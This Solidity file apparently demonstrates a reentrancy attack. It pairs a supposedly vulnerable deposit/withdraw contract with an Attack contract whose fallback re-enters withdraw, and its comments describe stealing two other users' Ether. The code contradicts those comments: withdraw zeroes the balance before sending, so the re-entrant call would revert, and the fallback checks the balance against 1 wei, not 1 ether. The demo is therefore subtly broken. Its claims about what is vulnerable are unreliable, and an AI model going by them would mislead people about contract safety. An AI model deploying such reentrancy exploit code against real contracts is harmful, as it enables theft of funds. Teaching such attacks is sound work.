// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/*
Steps to reproduce:
1. Deploy ReentrantVulnerable
2. Deposit 1 Ether each from Alice and Bob into ReentrantVunerable
3. Deploy Attack with address of ReentrantVulnerable
4. Call Attack.attack sending 1 Ether from Eve. Eve will
get back 3 Ether (2 stolen from Alice and Bob, and 1
returned to Eve)

The attack calls ReentrantVulnerable.withdraw multiple times
before ReentrantVulnerable.withdraw finishes executing

Function calls
1. Attack.attack
2. ReentrantVulnerable.deposit
3. ReentrantVulnerable.withdraw
4. Attack fallback (receives 1 Ether)
    a. ReentrantVulnerable.withdraw
5. Attack fallback (receives 1 Ether)
    b. ReentrantVulnerable.withdraw
6. Attack fallback (receives 1 Ether)
    c. ReentrantVulnerable.withdraw
*/

contract ReentrantVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public payable {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    ReentrantVulnerable public reentrantVulnerable;

    constructor(address _reentrantVulnerableAddress) {
        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerableAddress);
    }

    function attack() external payable {
        reentrantVulnerable.deposit{value: 1 ether}();
        reentrantVulnerable.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {
        if (address(reentrantVulnerable).balance >= 1) {
            reentrantVulnerable.withdraw();
        }
    }
}
